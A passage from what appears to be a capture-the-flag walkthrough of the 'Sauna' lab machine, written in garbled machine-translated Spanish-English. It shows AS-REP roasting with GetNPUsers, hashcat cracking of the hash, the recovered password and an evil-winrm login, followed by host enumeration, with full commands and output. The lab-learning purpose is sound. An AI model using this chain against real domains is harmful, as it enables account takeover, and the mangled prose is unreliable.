3. that not hayan accounts with that configuración, what that obligaría reevaluar the next Verification of identity.

Which part of the output really matters: the users that devuelvan answer useful and cualquier diferencia clear between “user not válido” and “user válido but without AS-REP aprovechable”.

How the next decision changes: si appears an account with AS-REP, the chain avanza by Kerberos; si not appears ninguna, the next decision already not será “seguir insistiendo igual”, but rather review convention of names or move a otra Verification of identity.

## checks

Check that the command already not returns errores compatibles with clock skew.

Review si appears algún user with answer AS-REP clearly differentiated of the resto.

Anotar cualquier name that produzca output distinta, incluso although not entregue material useful completo, because can servir for validate the convention real of accounts.

Si not appears ningún result useful, not ampliar still the list with variantes aleatorias; first it is advisable interpret bien the output obtenida.

## writeup_notes

The clock-skew correction marcó the point in that the validación Kerberos moved of be potencialmente engañosa be técnicamente fiable. In a environment Active Directory, sincronizar the time not is a tarea auxiliar, but rather a condición previous for interpret correctly the results of autenticación.

Reusable lesson: before of sacar conclusiones on users or answers of Kerberos, it is advisable asegurarse of that the clock of the attacker environment is alineado with the of the domain. A error of time can do parecer inexistente a path that in realidad sigue completamente abierta.

## We run the block and review the output

❯ GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile usernames_priority.txt -no-pass -dc-ip 10.129.95.180
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:655d7bbbf26151b21bd1ee464be5be3c$1cc708ac52f286125fd08352f6102f10e3bb5bc62d5afb1bc146b1c05e60fbe0e9c0add9748c23d6aba8b066fcab139b2703b87997b9c04961704371a39585722c3deef03c9ff20676130cd2aa130d6ff005ae008f70ec9fe46f5eeee064218fa9338ca8ac265ff8a2a50133b8615d119624116b317bd85e8e91632e3a00f6ca2921b20d1d3803754a3326c17004c66c0c90be9426566bbe93e3c44aa633695a2b18248d4f30034d6cede5fadad9556394056a83a254bef2c0b88e76f5b852a4212583793817a79d1b234993cc606c7eb21ca344e912c7077fd431ecaae2be42bdcf713e790085cccf5bcc283324bc7d20a490178dc5e47339d7bb0c6b929158
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)

## objective

Interpret the output of `GetNPUsers.py`, separar what that already has quedado demostrado of what that sigue pending and fijar the single next step without open branches paralelas.

## Verified facts

The prueba has producido a result useful and concluyente: **`fsmith` is a main válido of the domain** and, also, **not requiere Kerberos pre-authentication**, already that has devuelto a **AS-REP roastable hash**.

The convention **initial + apellido** remains fuertemente validated by the evidence observed. Not  trata already of a assumption estilística, but rather of an account real identificada in the domain.

The mayoría of the demás candidates have devuelto `KDC_ERR_C_PRINCIPAL_UNKNOWN`, what that indica that **not exist in the basis Kerberos with esos names exactos**.

The phase of “derivar identities from the web” already has dado a fruto operational real: not only  obtained a list plausible, but rather a valid account and aprovechable.

## assumptions

The inference main is that the next step natural already not is seguir afinando conventions of user, but rather **trabajar on the hash AS-REP obtenido of `fsmith`**.

Also is reasonable suponer that, si the account `fsmith` appears in this chain, could be a user reusable in phases posteriores of remote access, siempre that the Offline password recovery tenga éxito.

Sigue pending of verify cuál is the cleartext password asociada `fsmith` and si that credential será reusable in a service of remote access of the system.

## method

First  cierra the etapa of validación of names of user, because already has cumplido su función: identificar an account real of the domain and encontrar a debilidad specific in Kerberos.

Afterwards  prioriza single acción coherente with that evidence: **preservar the hash and pasarlo a recovery offline of password**. Not it is advisable volver now a LDAP, SMB or web, because this path already has demostrado much more value that the demás.

## answer

This result is very good.

The hallazgo important not is simplemente that “has salido something”, but rather that the chain methodological has quedado validated of punta punta:

1. the web expuso real names,
2. esos names permitieron derivar accounts plausible,
3. the convention `inicial + apellido` resultó correct to the less for a case real,
4. and a of esas accounts, `fsmith`, returns a AS-REP hash aprovechable.

That convierte a `fsmith` in the **dominant finding current**.

A basis of here, seguir generando more users or insistir with otras variantes tendría less sentido that before, because already exists a path much more strong abierta. The main branch leaves of be “enumeration of identities” and moves a be **Kerberos abuse with material offline already obtenido**.

The single next step correct is **save the hash of `fsmith` in a file clean and tratar the recovery of the password as offline work local of the operador**. That is the transición natural and more ordenada.

**Dominant finding now:** `fsmith` is a valid account of the domain and returns a AS-REP hash explotable offline.

**Active main branch:** abuse of Kerberos a basis of an account identificada by ASREPRoasting.

**Secondary branches noted:** validación later of remote access with credentials, and only in segundo plane LDAP/SMB si more adelante hicieran falta for context adicional.

**Single next step:** save the hash of `fsmith` in a file dedicado and move a Offline password recovery.

## commands

```bash id="p9r4kn"
cat > asrep_fsmith.txt <<'EOF'
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:655d7bbbf26151b21bd1ee464be5be3c$1cc708ac52f286125fd08352f6102f10e3bb5bc62d5afb1bc146b1c05e60fbe0e9c0add9748c23d6aba8b066fcab139b2703b87997b9c04961704371a39585722c3deef03c9ff20676130cd2aa130d6ff005ae008f70ec9fe46f5eeee064218fa9338ca8ac265ff8a2a50133b8615d119624116b317bd85e8e91632e3a00f6ca2921b20d1d3803754a3326c17004c66c0c90be9426566bbe93e3c44aa633695a2b18248d4f30034d6cede5fadad9556394056a83a254bef2c0b88e76f5b852a4212583793817a79d1b234993cc606c7eb21ca344e912c7077fd431ecaae2be42bdcf713e790085cccf5bcc283324bc7d20a490178dc5e47339d7bb0c6b929158
EOF

wc -l asrep_fsmith.txt
cat asrep_fsmith.txt
```

 propone this step because the evidence useful already not is in the output completa of the command, but rather in **preservar limpiamente the artefacto valioso**: the hash AS-REP of `fsmith`.

What does:

* guarda the hash in a file dedicado;
* allows verify that the file contiene exactamente a línea;
* leaves listo the material for recovery offline local.

What is expected:

* a file clean, reusable and without noise;
* trazabilidad clear between hallazgo, artefacto and next phase.

Which part of the output really matters:

* that `wc -l` devuelva `1`;
* that the file contenga only the hash of `fsmith`.

How the next decision changes:

* a vez guardado correctly, the next phase already not será “seguir buscando users”, but rather **recover offline the password asociada `fsmith`** and volver with the result for interpret su value operational.

## checks

Confirm that `asrep_fsmith.txt` contiene a sola línea.

Not mezclar in that file errores `KDC_ERR_C_PRINCIPAL_UNKNOWN` nor otras outputs of the command.

Keep `usernames_priority.txt` as evidence of the phase of derivation of users and `asrep_fsmith.txt` as artefacto of the phase Kerberos.

Dejar anotado that `fsmith` valida of forma strong the convention `inicial + apellido`.

## writeup_notes

The phase of derivation of identities not only allowed build a list plausible of users, but rather demostrar cuál was a convention real of the domain. The account `fsmith` confirmed the patrón `inicial + apellido` and, also, showed a configuración of Kerberos weak to the devolver a AS-REP hash without requerir pre-authentication.

Reusable lesson: when a phase of enumeration produce a user real and also a material criptográfico aprovechable offline, the prioridad already not must be ampliar lists of names, but rather preservar that artefacto, tratarlo as evidence central and orient the next phase alrededor of él.

## We run the block and review the output

❯ cat > asrep_fsmith.txt <<'EOF'
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:655d7bbbf26151b21bd1ee464be5be3c$1cc708ac52f286125fd08352f6102f10e3bb5bc62d5afb1bc146b1c05e60fbe0e9c0add9748c23d6aba8b066fcab139b2703b87997b9c04961704371a39585722c3deef03c9ff20676130cd2aa130d6ff005ae008f70ec9fe46f5eeee064218fa9338ca8ac265ff8a2a50133b8615d119624116b317bd85e8e91632e3a00f6ca2921b20d1d3803754a3326c17004c66c0c90be9426566bbe93e3c44aa633695a2b18248d4f30034d6cede5fadad9556394056a83a254bef2c0b88e76f5b852a4212583793817a79d1b234993cc606c7eb21ca344e912c7077fd431ecaae2be42bdcf713e790085cccf5bcc283324bc7d20a490178dc5e47339d7bb0c6b929158
EOF

wc -l asrep_fsmith.txt
cat asrep_fsmith.txt
1 asrep_fsmith.txt
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: asrep_fsmith.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:655d7bbbf26151b21bd1ee464be5be3c$1cc708ac52f286125fd08352f6102f10e3bb5bc62d5afb1bc146b1c05e60fbe0e9c0add9748c23d6aba8b066fcab139b2703b87997b9c04961704371a39585722c3deef03
       │ c9ff20676130cd2aa130d6ff005ae008f70ec9fe46f5eeee064218fa9338ca8ac265ff8a2a50133b8615d119624116b317bd85e8e91632e3a00f6ca2921b20d1d3803754a3326c17004c66c0c90be9426566bbe93e3c44aa633695a2b18248d4f30034d6cede5fadad9556
       │ 394056a83a254bef2c0b88e76f5b852a4212583793817a79d1b234993cc606c7eb21ca344e912c7077fd431ecaae2be42bdcf713e790085cccf5bcc283324bc7d20a490178dc5e47339d7bb0c6b929158
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

## objective

Confirm that the artefacto Kerberos has quedado guardado correctly and dejar preparada the next phase local: Offline password recovery asociada `fsmith`.

## Verified facts

The file `asrep_fsmith.txt`  has creado correctly.

The comprobación with `wc -l` confirms that the file contiene **a sola línea**, that is exactamente what that matters in this point.

The contenido useful of the file is the hash AS-REP of `fsmith`, already aislado and without noise adicional.

The salto of línea visual that appears to the mostrar the file not indica that the contenido esté roto; is only ajuste of the visualización in pantalla. Operativamente, the artefacto is bien.

With esto, the phase of obtaining and preservación of the material AS-REP can darse by closed.

## assumptions

The hipótesis of trabajo main is that the password of `fsmith` could be recuperable mediante attack offline with dictionary.

Also is reasonable suponer that, si that password  recupera, podrá evaluarse afterwards si has value operational in services of remote access of the objective.

Still sigue pending of verify si the password será what bastante weak as for aparecer in a dictionary común or si hará falta estrategia local more costosa.

## method

First  confirms that the hash useful has quedado preservado in a file clean and reusable.

Afterwards  evita seguir generando more identities or open secondary branches, because the path current already has producido a artefacto of much more value.

The single next step moves a be offline work local on that hash, without necesidad of volver a interactuar still with the domain.

## answer

This point has quedado bien fact.

What important not is only that the file exista, but rather that now already there is a artefacto clean, bien aislado and listo for trabajar fuera of línea. That mejora much the trazabilidad of the case: a cosa is the output noisy of the command that detectó the AS-REP, and otra much more useful is have the hash central guardado in su own file.

A basis of here, the main branch leaves of be “buscar users” and moves a be **offline work on the hash of `fsmith`**.

Not it is advisable volver atrás a LDAP, SMB or more derivation of names. That part already cumplió su función. The evidence dominant now is much more strong: exists a valid account of the domain and already  dispone of material Kerberos recuperable offline.

**Dominant finding now:** `fsmith` is a valid account of the domain and su hash AS-REP already is preservado correctly for offline work.

**Active main branch:** abuse of Kerberos a basis of material obtenido by ASREPRoasting.

**Secondary branches noted:** validación later of remote access si appears a password reusable; LDAP and SMB remain in segundo plane.

**Single next step:** intentar the Offline password recovery of `fsmith`.

## commands

```bash id="n2v8qa"
hashcat -m 18200 asrep_fsmith.txt /usr/share/wordlists/rockyou.txt -O --outfile cracked_fsmith.txt
cat cracked_fsmith.txt
```

This step  propone because the signal previous already is sufficiently strong: not  trabaja on a hipótesis abstracta, but rather on a hash AS-REP real already guardado and clean.

What does:

* `hashcat -m 18200` usa the modo correspondiente a **Kerberos 5 AS-REP etype 23**, that is the formato of the hash obtenido.
* `asrep_fsmith.txt` is the artefacto of entrada already validated.
* `rockyou.txt` actúa as dictionary initial reasonable for a primera recovery offline.
* `--outfile cracked_fsmith.txt` guarda the result of forma clean si appears a coincidencia.
* `cat cracked_fsmith.txt` allows check si  recuperó a password.

What is expected:

* or bien a línea with the hash and the password recuperada;
* or bien ningún result, what that indicará that with that dictionary initial not has habido éxito.

Which part of the output really matters:

* cualquier línea guardada in `cracked_fsmith.txt`;
* and, si not appears nada, si Hashcat indica simplemente that not encontró coincidencia, not that haya problema of formato.

How the next decision changes:

* si appears a password, the next analysis  centrará in su value operational;
* si not appears, not significará that the path haya muerto, but rather that the primera estrategia offline not bastó.

## checks

Confirm that Hashcat acepta the formato without errores.

Check si `cracked_fsmith.txt`  crea and contiene a línea useful.

Si not appears result, not modificar still `asrep_fsmith.txt`; must seguir intacto as artefacto basis.

Keep separados the dos files: uno as evidence original (`asrep_fsmith.txt`) and otro as posible result (`cracked_fsmith.txt`).

## writeup_notes

The obtaining of a hash AS-REP only abre the puerta; the point metodológicamente correct next is aislar that material and trabajarlo offline, without mezclarlo with the noise of the output original. That convierte a hallazgo puntual in a artefacto technical trazable and reusable.

Reusable lesson: when a valid account of the domain returns a AS-REP roastable, the prioridad leaves of be seguir buscando more names and moves a be preservar the hash correctly and tratarlo as the centro of the next phase.

## We run the block and review the output

❯ hashcat -m 18200 asrep_fsmith.txt /usr/share/wordlists/rockyou.txt -O --outfile cracked_fsmith.txt
cat cracked_fsmith.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz, 2802/5668 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://Hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://Hashcat.net/faq/morework


Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:655d7bb...929158
Time.Started.....: Thu Apr 23 20:58:17 2026 (7 secs)
Time.Estimated...: Thu Apr 23 20:58:24 2026 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1810.7 kH/s (0.80ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10541059/14344385 (73.49%)
Rejected.........: 2051/10541059 (0.02%)
Restore.Point....: 10536957/14344385 (73.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: TiffanyFWright -> TerryJackson
Hardware.Mon.#1..: Util: 11%

Started: Thu Apr 23 20:58:03 2026
Stopped: Thu Apr 23 20:58:25 2026
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: cracked_fsmith.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:655d7bbbf26151b21bd1ee464be5be3c$1cc708ac52f286125fd08352f6102f10e3bb5bc62d5afb1bc146b1c05e60fbe0e9c0add9748c23d6aba8b066fcab139b2703b87997b9c04961704371a39585722c3deef03
       │ c9ff20676130cd2aa130d6ff005ae008f70ec9fe46f5eeee064218fa9338ca8ac265ff8a2a50133b8615d119624116b317bd85e8e91632e3a00f6ca2921b20d1d3803754a3326c17004c66c0c90be9426566bbe93e3c44aa633695a2b18248d4f30034d6cede5fadad9556
       │ 394056a83a254bef2c0b88e76f5b852a4212583793817a79d1b234993cc606c7eb21ca344e912c7077fd431ecaae2be42bdcf713e790085cccf5bcc283324bc7d20a490178dc5e47339d7bb0c6b929158:Thestrokes23
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

## objective

Interpret the result of the recovery offline, confirm the value operational real of the credential obtenida and fijar a single next step and clean dentro of the main branch of the case.

## Verified facts

The recovery offline has tenido éxito.

The account **`fsmith`** already not is only a identity válida of the domain, but rather an account with **credential in clear recuperada**:

* user: `fsmith`
* password: `Thestrokes23`

The hash AS-REP was correct, the formato usado in Hashcat was the adecuado and the dictionary initial bastó for recover the password in pocos segundos.

The chain methodological remains validated of extremo a extremo:

1. the public website expuso real names;
2. esos names permitieron derivar users plausible;
3. the convention `inicial + apellido` resultó correct;
4. `fsmith` returned a AS-REP hash aprovechable;
5. that hash allowed recover a cleartext password.

Also, sigue siendo a Verified fact that **WinRM is abierto in 5985/tcp**, by what that already exists a path natural of validación of remote access.

## assumptions

The hipótesis main is that the credential `fsmith : Thestrokes23` can have value operational inmediato for remote access.

The hipótesis more reasonable for the next validación is **WinRM**, not because sea the single posibilidad, but rather because already is exposed, is a service pensado for administración remote and encaja bien with a comprobación clean of credentials.

Sigue pending of verify si that account has permission efectivo of remote access or si the password only será useful for otras phases of the case.

## method

First  cierra formalmente the phase of Kerberos offline, because already has cumplido su función: obtain a credential real of the domain.

Afterwards  elige a sola Verification of access that tenga sentido with the evidence observed. Not  abren a the vez SMB, LDAP and otras rutas, because in this point the comprobación more clean and of greater value is a validación controlada on WinRM.

## answer

This is a point of inflexión clear in the machine.

Until now the main branch estaba centrada in **identity + Kerberos**. From this momento, that phase remains closed with éxito and the branch dominant moves a be **validación of remote access with Recovered credential**.

What important not is only that haya aparecido a password, but rather that now already exists a **complete credential and reusable**. That cambia by completo the calidad of the evidence:  leaves atrás the enumeration of candidates and  entra in the phase of access real.

The single next step correct is **probar of forma controlada si `fsmith` can autenticarse by WinRM**. That decision has sentido by several razones:

* WinRM already estaba exposed from the phase 1.
* Is a path of administración remote typical in Windows.
* Allows validate rápidamente si the Recovered credential has value práctico inmediato.
* Si funciona, the case avanza with a evidence very strong.
* Si not funciona, not invalida the credential, only forces a reinterpretar su alcance.

**Dominant finding now:**  has recuperado in clear the password of a valid account of the domain: `fsmith : Thestrokes23`.

**Active main branch:** validación of remote access with credential obtenida from ASREPRoasting.

**Secondary branches noted:** SMB and LDAP siguen as rutas of context secondary; not dominan mientras exista complete credential pending of validate by WinRM.

**Single next step:** check si `fsmith` can autenticarse by WinRM.

## commands

```bash id="7mvq1x"
evil-WinRM -i 10.129.95.180 -u fsmith -p 'Thestrokes23'
```

This command  propone because the signal previous already is very strong: exists a complete credential and a service of administración remote exposed.

What does: tries autenticarse by WinRM with the account recuperada.

What is expected:

* or bien a sesión remote válida, what that convertiría the access initial in Verified fact;
* or bien a fallo of autenticación or of autorización, what that obligaría reinterpretar the value of the credential without negar that the password sea correct.

Which part of the output really matters:

* si the autenticación  completa;
* si appears prompt remote;
* or, in case of fallo, si the mensaje indica credential inválida or falta of permissions for WinRM.

How the next decision changes:

* si entra, the next phase pasará a be enumeration internal of the system already with access real;
* si not entra, the credential seguirá siendo valiosa, but habrá that decidir otra path of validación compatible with that user.

## checks

Check si the sesión WinRM  establece correctly.

Si entra, verify of inmediato the context with checks básicas of identity and privileges.

Si not entra, not desechar the credential: distinguish between “password incorrecta” and “user válido without permission of WinRM”.

Keep `cracked_fsmith.txt` as evidence of the result offline and not sobrescribir the artefactos previos.

## writeup_notes

The phase of ASREPRoasting not terminó simplemente with the obtaining of a hash, but rather with the recovery efectiva of a password reusable. That momento marca the step of a phase of abuse of autenticación a phase of validación of access real on services remotos of the system.

Reusable lesson: in a chain of Active Directory, recover a cleartext password cambia the case by completo. A basis of ahí, the prioridad leaves of be seguir buscando users and moves a be validate, with the smaller noise posible, in what surface exposed that credential has value operational real.

## We run the block and review the output

❯ evil-winrm -i 10.129.95.180 -u fsmith -p 'Thestrokes23'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-WinRM#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents>


objective

Confirm that the Recovered credential has value operational real, close the phase of access initial and fijar a primera enumeration internal mínima, ordenada and useful for decidir the next branch.

verified_facts

The autenticación by WinRM has funcionado correctly.

The account `fsmith` not only was válida in the domain, but rather also reusable for remote access interactivo to the objective.

The prompt remote confirms already a **foothold real** in the machine:

`*Evil-WinRM* PS C:\Users\FSmith\Documents>`

With esto remains verified toda the chain previous:

* real names expuestos in the web
* derivation of candidate users
* validación of the convention `inicial + apellido`
* obtaining of hash AS-REP for `fsmith`
* Offline password recovery
* remote access válido with `fsmith`

assumptions

The inference main is that `fsmith` dispone to the less of permissions suficientes for remote access by WinRM, but still not is verified cuál is su nivel real dentro of the system nor of the domain.

Also is reasonable suponer that the next phase useful already not is insistir in Kerberos nor in derivation of identities, but rather do a **enumeration internal short and bien enfocada** for responder tres preguntas:

* quién is exactamente this user dentro of the domain
* what information of the system and of the context AD remains visible from this sesión
* what pista dominant appears for the next escalada

Still sigue pending of verify si the user pertenece a groups with value especial, si there is credentials reutilizables in the host or si exists alguna configuración operational interesante for pivotar a the next phase.

method

First  cierra formalmente the phase of access initial because already not is a hipótesis: exists remote shell válida.

Afterwards  propone a enumeration internal mínima, not infinita, oriented a context and decision. The idea not is disparar tools a ciegas, but rather obtain first identity, groups, system, domain and artefactos básicos of the profile of the user.

Not it is advisable open still several branches a the vez. With this access, the single next step correct is a **enumeration internal básica and trazable**.

answer

perfect. Already there is foothold real.

This is the primer gran closure technical of the machine: the Recovered credential not was only válida in abstracto, but rather operational on a service remote exposed. That convierte a `fsmith` in a access initial plenamente confirmado.

A basis of here cambia the lógica of the case. The main branch already not is “obtain access”, because that phase has terminado. The main branch moves a be **enumeration internal of the host and of the context of domain from the sesión of `fsmith`**.

Not matters still jump directly a tools pesadas nor a múltiples verificaciones paralelas. What more clean is sacar first a block short of context that permita decidir the next acción with basis real.

Dominant finding now: `fsmith` proporciona remote access interactivo válido by WinRM.

Active main branch: enumeration internal post-foothold in environment Windows/AD.

Secondary branches noted: revisión of privileges local, context of domain, posibles credentials expuestas and, only afterwards, escalada según the evidence that aparezca.

Single next step: obtain a block mínimo of identity, groups, system, domain and flag of user from the sesión current.

commands

```powershell
whoami
whoami /groups
hostname
ipconfig /all
systeminfo
echo $env:USERDOMAIN
echo $env:COMPUTERNAME
dir C:\Users
type C:\Users\FSmith\Desktop\user.txt
```

Why these commands are proposed:

`whoami`  usa for confirm the context exacto of the user autenticado. Although the prompt already suggests `FSmith`, matters dejar evidence explícita and reusable.

`whoami /groups` sirve for ver what groups efectivos has the user. The signal previous for usarlo is clear: already exists access real and now matters saber si the value of the user is in sus pertenencias, not only in su name.

`hostname`, `ipconfig /all`, `systeminfo`, `echo $env:USERDOMAIN` and `echo $env:COMPUTERNAME`  usan for fijar the context technical of the host: name, domain, versión of the system and detalles operativos that afterwards ayudan a interpret cualquier hallazgo. Not son commands “by rutina”, but rather for anclar the evidence of the environment before of buscar paths of escalada.

`dir C:\Users` allows ver what profiles exist in the system. That aporta reading rápida of what otros users have iniciado sesión or have profile local, something very valioso in Windows.

`type C:\Users\FSmith\Desktop\user.txt` sirve for verify the access to the flag of user and close formalmente the phase of foothold.

What esperamos obtain:

* identity exacta of the user
* groups relevant
* context of the host and of the domain
* list initial of profiles local
* confirmación of the user flag

Which part of the output really matters:

* groups not triviales in `whoami /groups`
* name of the domain and versión of the system
* profiles of service or accounts administrativas in `C:\Users`
* si the flag of user is legible from this context

How the next decision changes según the result:

* si appear groups or profiles interesantes, the next phase  centrará in ellos
* si the context of the system suggests a path clear,  priorizará that evidence
* si todo parece normal, entonces tocará move a enumeration more profunda of the host with a tool of apoyo

checks

Check that `whoami` returns exactamente the user esperado and save that evidence as closure of the access initial.

Review `whoami /groups` buscando pertenencias with value especial or fuera of what normal.

Anotar cualquier name interesante in `C:\Users`, on todo accounts of service or profiles that not encajen with a user estándar.

Confirm si `user.txt` is accesible from the sesión current, because that cierra of forma clean the phase of user.

writeup_notes

The autenticación correct by WinRM confirmed that the Recovered credential from ASREPRoasting had value operational real. That momento marcó the fin of the phase of access initial and the comienzo of the enumeration internal of the system from a user of domain válido.

Reusable lesson: when a Recovered credential funciona on a service remote exposed, not it is advisable jump inmediatamente a tools pesadas. First merece the pena fijar identity, groups, system and context of the domain, because that basis ordena much better the next decision of escalada.

## We run the block and review the output

*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami
egotisticalbank\fsmith
*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
*Evil-WinRM* PS C:\Users\FSmith\Documents> hostname
SAUNA
*Evil-WinRM* PS C:\Users\FSmith\Documents> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : SAUNA
   Primary Dns Suffix  . . . . . . . : EGOTISTICAL-BANK.LOCAL
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : Not
   WINS Proxy Enabled. . . . . . . . : Not
   DNS Suffix Search List. . . . . . : EGOTISTICAL-BANK.LOCAL
                                       htb

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-94-EA-F0
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::165(Preferred)
   Lease Obtained. . . . . . . . . . : Thursday, April 23, 2026 10:52:13 AM
   Lease Expires . . . . . . . . . . : Thursday, April 23, 2026 12:52:12 PM
   IPv6 Address. . . . . . . . . . . : dead:beef::7cc2:310a:b259:9b93(Preferred)
   Link-local IPv6 Address . . . . . : fe80::7cc2:310a:b259:9b93%7(Preferred)
   IPv4 Address. . . . . . . . . . . : 10.129.95.180(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Thursday, April 23, 2026 10:52:15 AM
   Lease Expires . . . . . . . . . . : Thursday, April 23, 2026 12:52:15 PM
   Default Gateway . . . . . . . . . : fe80::250:56ff:fe94:9b51%7
                                       10.129.0.1
   DHCP Server . . . . . . . . . . . : 10.10.10.2
   DHCPv6 IAID . . . . . . . . . . . : 369119318
